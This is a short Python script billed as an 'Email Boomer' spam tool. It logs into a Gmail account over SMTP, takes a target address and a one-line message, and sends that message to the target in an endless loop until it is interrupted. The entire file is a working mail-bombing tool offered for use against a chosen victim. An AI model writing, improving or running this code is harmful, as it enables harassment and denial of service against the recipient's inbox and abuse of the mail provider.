import sys, os
import smtplib as s
from getpass import getpass
import time
#this program is setted for windows, when you wanna use linux, just setting it into linux version

os.system('cls')
print("="*80)
print("Welcome to Email Boomer, this spam for spamming one line text, be aware","\n\n","-"*25,"Copyright by xclone writer","-"*25)
print("="*80)
username = input("input email        : ") #input your email
password = getpass("input the password : ")

obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(username, password)

for i in range(5):
    print(".", end=" ", flush=True)
    time.sleep(0.5)


os.system('cls')

print('your email has been connected to the server, please send one line email and see the duration, it will be boomed')
ask = input("continue? y/n : ")
if ask == 'y':
    pass
else:
    os.system('cls')
    exit()

os.system('cls')
v_email = input("input email target   : ")
message = input("enter a line message : ")

email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s" % (username, "" .join(v_email), "" .join(message)))

try:
    print ("Message has been sent! Sending another..! Press Ctrl + C to stop.!")

    while 1:
      obj.sendmail(username, v_email, email_message)

except KeyboardInterrupt:
	os.system('cls')
	print("")
	print("==============")
	print("system is over")
  
